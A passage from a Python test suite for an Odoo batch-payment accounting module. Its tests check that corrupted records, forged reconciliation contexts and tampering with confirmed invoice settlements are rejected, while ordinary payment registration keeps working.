        if 'origin_payment_id' in self.env['account.move']._fields:
            self.skipTest('modern payment API has no pre-created draft move')
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        payment = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        target_line = payment.move_id.line_ids[:1]
        self.env.cr.execute(
            "UPDATE account_move_line SET date = %s, date_maturity = %s "
            "WHERE id = %s",
            ('2026-04-16', '2026-04-16', target_line.id),
        )
        target_line.invalidate_recordset(['date', 'date_maturity'])

        try:
            payment.write({'eh_batch_payment_id': batch.id})
        except UserError:
            pass
        else:
            self.fail('corrupt cash-line date projection joined batch')
        payment.invalidate_recordset(['eh_batch_payment_id'])
        self.assertFalse(payment.eh_batch_payment_id)

    def test_legacy_outstanding_account_is_derived_from_company_config(self):
        if 'origin_payment_id' in self.env['account.move']._fields:
            self.skipTest('modern payment API has a core account resolver')
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        payment = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        forged = self._ensure_account(
            self.env,
            '119998',
            'Forged batch cash account',
            'asset_current',
        )
        liquidity = payment._seek_for_lines()[0]
        self.env.cr.execute(
            "UPDATE account_payment SET outstanding_account_id = %s "
            "WHERE id = %s",
            (forged.id, payment.id),
        )
        self.env.cr.execute(
            "UPDATE account_move_line SET account_id = %s WHERE id = %s",
            (forged.id, liquidity.id),
        )
        payment.invalidate_recordset(['outstanding_account_id'])
        liquidity.invalidate_recordset(['account_id'])

        try:
            payment.write({'eh_batch_payment_id': batch.id})
        except UserError:
            pass
        else:
            self.fail('forged legacy outstanding account joined batch')
        payment.invalidate_recordset(['eh_batch_payment_id'])
        self.assertFalse(payment.eh_batch_payment_id)

    def test_payment_move_owner_link_cannot_detach_or_shadow_batch(self):
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        owner_field = (
            'origin_payment_id'
            if 'origin_payment_id' in self.env['account.move']._fields
            else 'payment_id'
        )
        batch.action_confirm()

        if member.move_id:
            with self.assertRaisesRegex(UserError, 'immutable'):
                member.move_id.write({owner_field: False})

        shadow = self.env['account.move'].create({
            'move_type': 'entry',
            'journal_id': self.journal_misc.id,
            'date': '2026-04-15',
        })
        with self.assertRaisesRegex(UserError, r'\S'):
            shadow.write({owner_field: member.id})
        with self.assertRaisesRegex(UserError, r'\S'):
            self.env['account.move'].create({
                'move_type': 'entry',
                'journal_id': self.journal_misc.id,
                'date': '2026-04-15',
                owner_field: member.id,
            })

        # Historic/SQL corruption seam: posting must resolve the direct owner
        # even when payment.move_id points elsewhere (or is still empty on 18+).
        self.env.cr.execute(
            "UPDATE account_move SET %s = %%s WHERE id = %%s" % owner_field,
            (member.id, shadow.id),
        )
        shadow.invalidate_recordset([owner_field])
        with self.assertRaisesRegex(UserError, 'batch Post workflow'):
            shadow.action_post()
        self.assertEqual(shadow.state, 'draft')

    def test_assignment_rejects_company_mismatch(self):
        """Even a corrupt/imported payment cannot cross legal entities."""
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        payment = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        other_company = self.env['res.company'].create({
            'name': 'Batch Integrity Other Company',
        })
        # Deliberately model a legacy/import corruption without asking core's
        # check_company guard to manufacture an otherwise-invalid record.
        self._sql_update_payment_field(
            payment, 'company_id', other_company.id,
        )
        payment.invalidate_recordset(['company_id'])

        with self.assertRaisesRegex(UserError, r'\S'):
            payment.write({'eh_batch_payment_id': batch.id})
        self.assertFalse(payment.eh_batch_payment_id)

    def test_assignment_rejects_journal_and_direction_mismatch(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        other_journal = self.env['account.journal'].create({
            'name': 'Other Batch Bank',
            'code': 'OBB',
            'type': 'bank',
            'company_id': self.env.company.id,
        })
        wrong_journal = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': other_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        wrong_direction = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'customer',
            'payment_type': 'inbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })

        with self.assertRaisesRegex(UserError, r'\S'):
            wrong_journal.write({'eh_batch_payment_id': batch.id})
        with self.assertRaisesRegex(UserError, r'\S'):
            wrong_direction.write({'eh_batch_payment_id': batch.id})

    def test_assignment_rejects_unposted_source(self):
        source = self.env['account.move'].create({
            'move_type': 'in_invoice',
            'partner_id': self.partner_a.id,
            'invoice_date': '2026-04-15',
            'invoice_line_ids': [(0, 0, {
                'name': 'Draft source',
                'quantity': 1,
                'price_unit': 100.0,
                'account_id': self.account_expense.id,
            })],
        })
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })

        with self.assertRaisesRegex(UserError, r'\S'):
            self.env['account.payment'].create({
                'eh_batch_payment_id': batch.id,
                'eh_source_move_ids': [(6, 0, source.ids)],
                'partner_id': self.partner_a.id,
                'partner_type': 'supplier',
                'payment_type': 'outbound',
                'journal_id': self.bank_journal.id,
                'amount': 100.0,
                'date': '2026-04-15',
            })

    def test_direct_duplicate_claim_in_same_batch_is_rejected(self):
        """The duplicate guard is model-level, not just a wizard precheck."""
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        common = {
            'eh_batch_payment_id': batch.id,
            'eh_source_move_ids': [(6, 0, source.ids)],
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        }
        self.env['account.payment'].create(common)

        with self.assertRaisesRegex(UserError, r'\S'):
            self.env['account.payment'].create(common)
        self.assertEqual(len(batch.payment_ids), 1)

    def test_assignment_locks_batch_payments_sources_and_phantoms(self):
        """Regression proof for the concurrent search/create claim window."""
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        real_execute = self.env.cr.execute
        seen = []

        def _record_execute(*args, **kwargs):
            if args:
                seen.append(str(args[0]))
            return real_execute(*args, **kwargs)

        with patch.object(self.env.cr, 'execute', _record_execute):
            self.env['account.payment'].create({
                'eh_batch_payment_id': batch.id,
                'eh_source_move_ids': [(6, 0, source.ids)],
                'partner_id': self.partner_a.id,
                'partner_type': 'supplier',
                'payment_type': 'outbound',
                'journal_id': self.bank_journal.id,
                'amount': 100.0,
                'date': '2026-04-15',
            })

        self.assertTrue(any(
            'pg_advisory_xact_lock' in query for query in seen
        ))
        for table in ('eh_batch_payment', 'account_payment', 'account_move'):
            self.assertTrue(any(
                table in query and 'FOR UPDATE' in query for query in seen
            ), "assignment must row-lock %s" % table)

    def test_confirm_reloads_locked_payment_state(self):
        """A stale pre-lock cache cannot hide a concurrent state change."""
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        self.assertEqual(member.state, 'draft')  # prime the stale cache
        self._sql_update_payment_field(
            member, 'state', self._payment_state_value('in_process'),
        )

        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_confirm()
        self.assertEqual(batch.state, 'draft')

    def test_confirm_revalidates_source_payment_state(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'eh_source_move_ids': [(6, 0, source.ids)],
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        self.env.cr.execute(
            "UPDATE account_move SET payment_state = 'paid' WHERE id = %s",
            (source.id,),
        )

        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_confirm()
        self.assertEqual(batch.state, 'draft')

    def test_confirmed_source_reconciliation_is_frozen(self):
        """A later payment cannot mutate an already-approved settlement."""
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()

        # Attempt a real external partial settlement. Reconciliation is now
        # serialized with the batch and rejected at the mutation boundary,
        # so a stale plan never changes the approved residual after confirm.
        external = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 90.0,
            'date': '2026-04-15',
        })
        external.action_post()
        pay_lines = external.move_id.line_ids.filtered(
            lambda line: line.account_id.account_type == 'liability_payable'
            and not line.reconciled,
        )
        source_lines = source.line_ids.filtered(
            lambda line: line.account_id.account_type == 'liability_payable'
            and not line.reconciled,
        )
        with self.assertRaisesRegex(UserError, r'\S'):
            (pay_lines + source_lines).reconcile()
        forged_lines = (pay_lines + source_lines).with_user(
            SUPERUSER_ID,
        ).with_context(eh_authorized_batch_reconcile=True)
        with self.assertRaisesRegex(UserError, r'\S'):
            forged_lines.reconcile()
        if hasattr(pay_lines, '_reconcile_plan'):
            with self.assertRaisesRegex(UserError, r'\S'):
                (pay_lines + source_lines).with_user(
                    SUPERUSER_ID,
                ).with_context(
                    eh_core_reconcile_capability=True,
                )._reconcile_plan([[pay_lines + source_lines]])
            with self.assertRaisesRegex(UserError, r'\S'):
                pay_lines._reconcile_plan([[self.partner_a]])

        debit = (pay_lines + source_lines).filtered(
            lambda line: line.balance > 0.0,
        )[:1]
        credit = (pay_lines + source_lines).filtered(
            lambda line: line.balance < 0.0,
        )[:1]
        amount = min(abs(debit.balance), abs(credit.balance))
        forged_partial = self.env['account.partial.reconcile'].with_user(
            SUPERUSER_ID,
        ).with_context(eh_authorized_batch_reconcile=True)
        with self.assertRaisesRegex(UserError, r'\S'):
            forged_partial.create({
                'debit_move_id': debit.id,
                'credit_move_id': credit.id,
                'amount': amount,
                'debit_amount_currency': amount,
                'credit_amount_currency': amount,
            })
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertEqual(source.payment_state, 'not_paid')
        self.assertAlmostEqual(source.amount_residual, 100.0)
        self.assertEqual(batch.state, 'confirmed')
        self.assertEqual(batch.payment_ids.state, 'draft')

    def test_standard_payment_register_remains_supported(self):
        """Batch guards must not break an ordinary register-payment flow."""
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        register = self.env['account.payment.register'].with_context(
            active_model='account.move',
            active_ids=source.ids,
        ).create({})

        payments = register._create_payments()

        self.assertEqual(len(payments), 1)
        payments.invalidate_recordset(['state', 'move_id'])
        self.assertNotEqual(payments.state, 'draft')
        self.assertTrue(payments.move_id)
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertTrue(source.currency_id.is_zero(source.amount_residual))
        self.assertIn(source.payment_state, ('paid', 'in_payment'))

    def test_payment_register_prelocks_existing_reconciliation_graph(self):
        """Older on-account counterpart is locked before newer source."""
        on_account = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 40.0,
            'date': '2026-04-14',
        })
        on_account.action_post()
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        source_line = source.line_ids.filtered(
            lambda line: line.account_id.account_type == 'liability_payable',
        )
        counterpart = on_account._seek_for_lines()[1]
        (source_line | counterpart).reconcile()
        source.invalidate_recordset(['amount_residual'])
        self.assertAlmostEqual(source.amount_residual, 60.0)
        self.assertLess(on_account.move_id.id, source.id)

        register = self.env['account.payment.register'].with_context(
            active_model='account.move',
            active_ids=source.ids,
        ).create({})
        real_execute = self.env.cr.execute
        advisory_move_ids = []
        module_wide_lock_seen = []

        def _record_execute(query, params=None, *args, **kwargs):
            key = (
                params[0]
                if isinstance(params, (tuple, list)) and params
                else False
            )
            prefix = 'eh_account_batch_payment.move_owner.v1:'
            if (
                'pg_advisory_xact_lock' in str(query)
                and isinstance(key, str)
                and key.startswith(prefix)
            ):
                advisory_move_ids.append(int(key[len(prefix):]))
            if key == 'eh_account_batch_payment.integrity.v1':
                module_wide_lock_seen.append(key)
            return real_execute(query, params, *args, **kwargs)

        with patch.object(self.env.cr, 'execute', _record_execute):
            payment = register._create_payments()

        expected_prefix = sorted({
            on_account.move_id.id % _OWNER_LOCK_STRIPES,
            source.id % _OWNER_LOCK_STRIPES,
        })
        self.assertEqual(
            advisory_move_ids[:len(expected_prefix)],
            expected_prefix,
        )
        self.assertFalse(
            module_wide_lock_seen,
            "ordinary Register Payment must not take the module-wide lock",
        )
        self.assertTrue(payment)
        source.invalidate_recordset(['amount_residual'])
        self.assertTrue(source.currency_id.is_zero(source.amount_residual))

    def test_non_superuser_registers_remainder_with_existing_graph(self):
        """Supporting reconciliation moves are lock scope, not ACL scope."""
        on_account = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 40.0,
            'date': '2026-04-14',
        })
        on_account.action_post()
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        source_line = source.line_ids.filtered(
            lambda line: line.account_id.account_type == 'liability_payable',
        )
        counterpart = on_account._seek_for_lines()[1]
        (source_line | counterpart).reconcile()
        source.invalidate_recordset(['amount_residual'])
        self.assertAlmostEqual(source.amount_residual, 60.0)

        actor = self.accountant_user
        self.assertFalse(actor._is_superuser())
        register = self.env['account.payment.register'].with_user(
            actor,
        ).with_context(
            active_model='account.move',
            active_ids=source.ids,
        ).create({})
        payment = register._create_payments()

        self.assertTrue(payment)
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertTrue(source.currency_id.is_zero(source.amount_residual))
        self.assertIn(source.payment_state, ('paid', 'in_payment'))

    def test_empty_unreconcile_is_noop_without_partial_unlink_acl(self):
        """Core may cancel an unreconciled document for a non-accountant."""
        actor = new_test_user(
            self.env,
            login='eh_batch_payment_non_accounting_cancel_actor',
            groups='base.group_user',
        )
        Partial = self.env['account.partial.reconcile'].with_user(actor)
        with self.assertRaises(AccessError):
            Partial._eh_check_access('unlink')

        empty_lines = self.env['account.move.line'].with_user(actor).browse()
        with self.assertRaises(AccessError):
            empty_lines._eh_check_access('unlink')
        # Empty recordset CRUD is a no-op; core return value is ``None`` on
        # Odoo 16 and ``True`` on later series.
        empty_lines.unlink()
        self.assertIsNone(empty_lines.remove_move_reconcile())

    def test_partial_reconcile_direct_material_write_is_rejected(self):
        """Partial financial/provenance fields are reconciliation-engine owned."""
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        external = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 50.0,
            'date': '2026-04-15',
        })
        external.action_post()
        payable_lines = (source | external.move_id).line_ids.filtered(
            lambda line: (
                line.account_id.account_type == 'liability_payable'
                and not line.reconciled
            ),
        )
        payable_lines.reconcile()
        source_line = source.line_ids.filtered(
            lambda line: line.account_id.account_type == 'liability_payable',
        )
        partial = (
            source_line.matched_debit_ids | source_line.matched_credit_ids
        )
        self.assertEqual(len(partial), 1)
        unrelated = self._post_supplier_invoice(self.partner_b, 25.0)
        original = (
            partial.amount,
            partial.debit_amount_currency,
            partial.credit_amount_currency,
        )

        for vals in (
            {'amount': -1.0},
            {'amount': float('nan')},
            {'amount': original[0] + 1.0},
            {
                'amount': original[0] - 10.0,
                'debit_amount_currency': original[1] - 10.0,
                'credit_amount_currency': original[2] - 10.0,
            },
            {'exchange_move_id': unrelated.id},
            {'company_id': partial.company_id.id},
        ):
            with self.assertRaisesRegex(UserError, r'\S'):
                partial.write(vals)

        partial.invalidate_recordset([
            'amount', 'debit_amount_currency', 'credit_amount_currency',
            'exchange_move_id',
        ])
        self.assertEqual(partial.amount, original[0])
        self.assertFalse(partial.exchange_move_id)

    def test_partial_reconcile_create_rejects_projections_and_bad_currency(self):
        """Direct partial create cannot forge server projections or amounts."""
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        external = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 50.0,
            'date': '2026-04-15',
        })
        external.action_post()
        lines = (source | external.move_id).line_ids.filtered(
            lambda line: (
                line.account_id.account_type == 'liability_payable'
                and not line.reconciled
            ),
        )
        debit = lines.filtered(lambda line: line.balance > 0.0)[:1]
        credit = lines.filtered(lambda line: line.balance < 0.0)[:1]
        base_vals = {
            'debit_move_id': debit.id,
            'credit_move_id': credit.id,
            'amount': 10.0,
            'debit_amount_currency': 10.0,
            'credit_amount_currency': 10.0,
        }
        Partial = self.env['account.partial.reconcile']
        before_ids = set(Partial.search([]).ids)

        forged_projection = dict(base_vals, company_id=self.company.id)
        with self.assertRaisesRegex(UserError, r'\S'):
            Partial.create(forged_projection)
        forged_exchange = dict(base_vals, exchange_move_id=source.id)
        with self.assertRaisesRegex(UserError, r'\S'):
            Partial.create(forged_exchange)
        incoherent_amounts = dict(
            base_vals,
            debit_amount_currency=20.0,
            credit_amount_currency=20.0,
        )
        with self.assertRaisesRegex(UserError, r'\S'):
            Partial.create(incoherent_amounts)

        self.assertEqual(set(Partial.search([]).ids), before_ids)

    def test_payment_register_rejects_confirmed_source_atomically(self):
        """Caught rejection cannot retain a posted ordinary-payment prefix."""
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        payment_ids_before = set(self.env['account.payment'].search([]).ids)
        move_ids_before = set(self.env['account.move'].search([]).ids)
        register = self.env['account.payment.register'].with_context(
            active_model='account.move',
            active_ids=source.ids,
        ).create({})

        try:
            register._create_payments()
        except UserError:
            pass
        else:
            self.fail('confirmed source accepted a register-payment workflow')

        self.assertEqual(
            set(self.env['account.payment'].search([]).ids),
            payment_ids_before,
        )
        self.assertEqual(
            set(self.env['account.move'].search([]).ids),
            move_ids_before,
        )
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertAlmostEqual(source.amount_residual, 100.0)
        self.assertEqual(source.payment_state, 'not_paid')
        self.assertEqual(batch.state, 'confirmed')
        self._assert_unposted_payment_moves(batch.payment_ids)

    def test_confirmed_source_raw_financial_and_full_links_are_frozen(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        settlement = source.line_ids.filtered(
            lambda line: line.account_id.account_type == 'liability_payable',
        )
        forged_line = settlement.with_user(SUPERUSER_ID).with_context(
            eh_authorized_batch_reconcile=True,
        )
        try:
            forged_line.write({
                'amount_residual': 0.0,
                'amount_residual_currency': 0.0,
                'reconciled': True,
            })
        except UserError:
            pass
        else:
            self.fail('raw source residual evidence unexpectedly changed')
        try:
            source.with_user(SUPERUSER_ID).with_context(
                eh_authorized_batch_reconcile=True,
            ).write({'payment_state': 'paid', 'amount_residual': 0.0})
        except UserError:
            pass
        else:
            self.fail('raw source header evidence unexpectedly changed')

        Full = self.env['account.full.reconcile'].with_user(
            SUPERUSER_ID,
        ).with_context(eh_authorized_batch_reconcile=True)
        with self.assertRaisesRegex(UserError, r'\S'):
            Full.create({
                'reconciled_line_ids': [(6, 0, settlement.ids)],
                'partial_reconcile_ids': [(6, 0, [])],
            })
        FullModel = self.env['account.full.reconcile']
        if 'name' in FullModel._fields:
            self.env.cr.execute(
                "INSERT INTO account_full_reconcile (name) VALUES (%s) "
                "RETURNING id",
                ('FORGED-EMPTY-FULL',),
            )
        else:
            self.env.cr.execute(
                "INSERT INTO account_full_reconcile DEFAULT VALUES "
                "RETURNING id",
            )
        empty_full = FullModel.browse(self.env.cr.fetchone()[0])
        self.env.cr.execute(
            "UPDATE account_move_line SET full_reconcile_id = %s "
            "WHERE id = %s",
            (empty_full.id, settlement.id),
        )
        settlement.invalidate_recordset(['full_reconcile_id'])
        empty_full.invalidate_recordset(['reconciled_line_ids'])
        try:
            empty_full.with_user(SUPERUSER_ID).with_context(
                eh_authorized_batch_reconcile=True,
            ).unlink()
        except UserError:
            pass
        else:
            self.fail('reviewed source full reconciliation was erased')
        settlement.invalidate_recordset([
            'amount_residual', 'amount_residual_currency', 'reconciled',
            'full_reconcile_id',
        ])
        self.assertAlmostEqual(settlement.amount_residual, -100.0)
        self.assertFalse(settlement.reconciled)
        self.assertEqual(settlement.full_reconcile_id, empty_full)
        self.assertEqual(batch.state, 'confirmed')

    def test_move_line_commands_cannot_target_reviewed_source_items(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [Command.set(source.ids)],
        }).action_build()
        batch.action_confirm()
        protected_line = source.invoice_line_ids[:1]
        original_name = protected_line.name

        attacker = self.env['account.move'].create({
            'move_type': 'entry',
            'journal_id': self.journal_misc.id,
            'date': '2026-04-15',
            'line_ids': [
                Command.create({
                    'name': 'Attacker debit',
                    'account_id': self.account_expense.id,
                    'debit': 10.0,
                }),
                Command.create({
                    'name': 'Attacker credit',
                    'account_id': self.account_revenue.id,
                    'credit': 10.0,
                }),
            ],
        })

        def commands():
            return (
                ('update', Command.update(
                    protected_line.id,
                    {'name': 'FORGED THROUGH PARENT'},
                )),
                ('link', Command.link(protected_line.id)),
                ('delete', Command.delete(protected_line.id)),
            )

        for operation, command in commands():
            with self.subTest(entrypoint='create', operation=operation):
                with self.assertRaisesRegex(
                    UserError, 'confirmed or posted batch source',
                ):
                    self.env['account.move'].create({
                        'move_type': 'entry',
                        'journal_id': self.journal_misc.id,
                        'date': '2026-04-15',
                        'line_ids': [command],
                    })
        for operation, command in commands():
            with self.subTest(entrypoint='write', operation=operation):
                with self.assertRaisesRegex(
                    UserError, 'confirmed or posted batch source',
                ):
                    attacker.write({'line_ids': [command]})

        protected_line.invalidate_recordset(['move_id', 'name'])
        self.assertTrue(protected_line.exists())
        self.assertEqual(protected_line.move_id, source)
        self.assertEqual(protected_line.name, original_name)
        self.assertEqual(batch.state, 'confirmed')

    def test_confirmed_source_inverse_and_provenance_links_are_frozen(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        attacker = self.env['account.move'].create({
            'move_type': 'entry',
            'journal_id': self.bank_journal.id,
            'date': '2026-04-15',
        })
        move_ids_before = set(self.env['account.move'].search([]).ids)

        try:
            source._reverse_moves(cancel=False)
        except UserError:
            pass
        else:
            self.fail('confirmed source accepted a reversal')
        self.assertEqual(
            set(self.env['account.move'].search([]).ids),
            move_ids_before,
        )
        with self.assertRaisesRegex(UserError, r'\S'):
            attacker.write({'reversed_entry_id': source.id})
        inverse_reversal = (
            'reversal_move_ids'
            if 'reversal_move_ids' in source._fields
            else 'reversal_move_id'
        )
        self.assertEqual(
            source._eh_batch_reversal_inverse_field(), inverse_reversal,
        )
        with self.assertRaisesRegex(UserError, r'\S'):
            source.write({inverse_reversal: [(4, attacker.id)]})
        if 'tax_cash_basis_origin_move_id' in attacker._fields:
            with self.assertRaisesRegex(UserError, r'\S'):
                attacker.write({
                    'tax_cash_basis_origin_move_id': source.id,
                })
        if 'tax_cash_basis_created_move_ids' in source._fields:
            with self.assertRaisesRegex(UserError, r'\S'):
                source.write({
                    'tax_cash_basis_created_move_ids': [(4, attacker.id)],
                })
        if 'matched_payment_ids' in source._fields:
            with self.assertRaisesRegex(UserError, r'\S'):
                source.write({
                    'matched_payment_ids': [(3, batch.payment_ids.id)],
                })
        self.assertFalse(attacker.reversed_entry_id)
        self.assertEqual(batch.state, 'confirmed')

    def test_confirmed_source_non_settlement_line_can_still_reconcile(self):
        # Taxes, clearing, and cash-basis lines can legitimately be
        # reconcilable on the same invoice. The batch approves only the AR/AP
        # settlement leg and must not freeze these unrelated close workflows.
        self.account_expense.reconcile = True
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()

        closing = self.post_balanced_move([
            {'account': self.account_cash, 'debit': 100.0},
            {'account': self.account_expense, 'credit': 100.0},
        ], date='2026-04-15')
        source_expense = source.line_ids.filtered(
            lambda line: line.account_id == self.account_expense,
        )
        closing_expense = closing.line_ids.filtered(
            lambda line: line.account_id == self.account_expense,
        )
        (source_expense + closing_expense).reconcile()
        source_expense.invalidate_recordset(['reconciled'])
        self.assertTrue(source_expense.reconciled)

    def test_nonbatch_cash_account_reconciliation_remains_supported(self):
        self.assertEqual(self.account_cash.account_type, 'asset_cash')
        self.assertFalse(self.account_cash.reconcile)
        debit_move = self.post_balanced_move([
            {'account': self.account_cash, 'debit': 25.0},
            {'account': self.account_revenue, 'credit': 25.0},
        ], date='2026-04-15')
        credit_move = self.post_balanced_move([
            {'account': self.account_cash, 'credit': 25.0},
            {'account': self.account_expense, 'debit': 25.0},
        ], date='2026-04-15')
        cash_lines = (debit_move | credit_move).line_ids.filtered(
            lambda line: line.account_id == self.account_cash,
        )

        cash_lines.reconcile()

        cash_lines.invalidate_recordset(['reconciled'])
        self.assertTrue(all(cash_lines.mapped('reconciled')))

    def test_zero_company_amount_foreign_residual_can_reconcile(self):
        """Keep Odoo's multi-currency rounding corner case supported."""
        company_currency = self.env.company.currency_id
        foreign_currency = self.env.ref('base.EUR')
        foreign_currency.active = True
        self.env.company.write({
            'currency_exchange_journal_id': self.journal_misc.id,
            'income_currency_exchange_account_id': self.account_revenue.id,
            'expense_currency_exchange_account_id': self.account_expense.id,
        })

        def _make_reconcile_line(balance, amount_currency, currency):
            move = self.env['account.move'].create({
                'move_type': 'entry',
                'journal_id': self.journal_misc.id,
                'date': '2026-04-15',
                'line_ids': [(0, 0, {
                    'debit': balance if balance > 0.0 else 0.0,
                    'credit': -balance if balance < 0.0 else 0.0,
                    'amount_currency': amount_currency,
                    'currency_id': currency.id,
                    'account_id': self.account_receivable.id,
                    'partner_id': self.partner_a.id,
                }), (0, 0, {
                    'debit': -balance if balance < 0.0 else 0.0,
                    'credit': balance if balance > 0.0 else 0.0,
                    'amount_currency': -amount_currency,
                    'currency_id': currency.id,
                    'account_id': self.account_revenue.id,
                })],
            })
            move.action_post()
            return move.line_ids.filtered(
                lambda line: line.account_id == self.account_receivable,
            )

        credit = _make_reconcile_line(
            -0.01,
            -0.01,
            company_currency,
        )
        zero_balance_debit = _make_reconcile_line(
            0.0,
            0.03,
            foreign_currency,
        )
        (credit + zero_balance_debit).reconcile()
        partials = (
            credit.matched_debit_ids
            | credit.matched_credit_ids
            | zero_balance_debit.matched_debit_ids
            | zero_balance_debit.matched_credit_ids
        )
        zero_company_partials = partials.filtered(
            lambda partial: (
                company_currency.is_zero(partial.amount)
                and not partial.debit_currency_id.is_zero(
                    partial.debit_amount_currency,
                )
            ),
        )
        self.assertTrue(zero_company_partials)
        zero_company_foreign_total = sum(
            zero_company_partials.mapped('debit_amount_currency'),
        )
        self.assertGreater(zero_company_foreign_total, 0.0)
        self.assertLessEqual(zero_company_foreign_total, 0.03)

    def test_forged_exchange_context_cannot_reconcile_draft_lines(self):
        """RPC context cannot impersonate core exchange-difference work."""
        def _draft_receivable(balance):
            move = self.env['account.move'].create({
                'move_type': 'entry',
                'journal_id': self.journal_misc.id,
                'date': '2026-04-15',
                'line_ids': [(0, 0, {
                    'debit': balance if balance > 0.0 else 0.0,
                    'credit': -balance if balance < 0.0 else 0.0,
                    'account_id': self.account_receivable.id,
                    'partner_id': self.partner_a.id,
                }), (0, 0, {
                    'debit': -balance if balance < 0.0 else 0.0,
                    'credit': balance if balance > 0.0 else 0.0,
                    'account_id': self.account_revenue.id,
                })],
            })
            return move.line_ids.filtered(
                lambda line: line.account_id == self.account_receivable,
            )

        debit = _draft_receivable(10.0)
        credit = _draft_receivable(-10.0)
        forged = self.env['account.partial.reconcile'].with_context(
            no_exchange_difference=True,
            eh_core_reconcile_capability=True,
            eh_core_reconcile_origin_no_exchange=False,
        )
        with self.assertRaisesRegex(UserError, r'\S'):
            forged.create({
